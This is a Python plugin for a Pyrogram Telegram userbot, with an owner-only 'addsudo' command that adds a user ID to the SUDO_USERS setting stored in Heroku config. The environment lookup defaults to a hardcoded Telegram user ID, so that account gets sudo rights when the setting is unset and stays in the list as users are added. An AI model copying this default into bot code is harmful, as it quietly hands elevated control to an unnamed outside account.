import os
import sys
import heroku3
from datetime import datetime
from pyrogram import Client, filters, enums
from BADMUNDA.Config import HEROKU_API_KEY, HEROKU_APP_NAME, HANDLER, OWNER_ID, SUDO_USERS
from BADMUNDA.Config import *

@Client.on_message(filters.command("addsudo", prefixes=HANDLER) & filters.private)
async def addsudo(client, message):
    if message.from_user.id != OWNER_ID:
        return await message.reply("✦ ꜱᴏʀʀʏ, ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴀᴄᴄᴇꜱꜱ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.")

    if not message.reply_to_message or not message.reply_to_message.from_user:
        return await message.reply("✦ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ.")

    target_id = message.reply_to_message.from_user.id
    sudo_env = os.getenv("SUDO_USERS", "7694539822")

    if str(target_id) in sudo_env.split():
        return await message.reply("✦ ᴛʜɪꜱ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀ ꜱᴜᴅᴏ ᴜꜱᴇʀ !!")

    msg = await message.reply("✦ ᴀᴅᴅɪɴɢ ᴜꜱᴇʀ ᴀꜱ ꜱᴜᴅᴏ...")

    if HEROKU_APP_NAME is None:
        return await msg.edit("✦ `[HEROKU] ➥` Please set **HEROKU_APP_NAME** in your config.")

    try:
        heroku = heroku3.from_key(HEROKU_API_KEY)
        app = heroku.app(HEROKU_APP_NAME)
        heroku_vars = app.config()
    except Exception as e:
        return await msg.edit(f"✦ Failed to connect to Heroku:\n`{e}`")

    updated_sudo = f"{sudo_env} {target_id}".strip()
    heroku_vars["SUDO_USERS"] = updated_sudo

    await msg.edit(f"✦ **ɴᴇᴡ ꜱᴜᴅᴏ ᴜꜱᴇʀ** ➥ `{target_id}`")
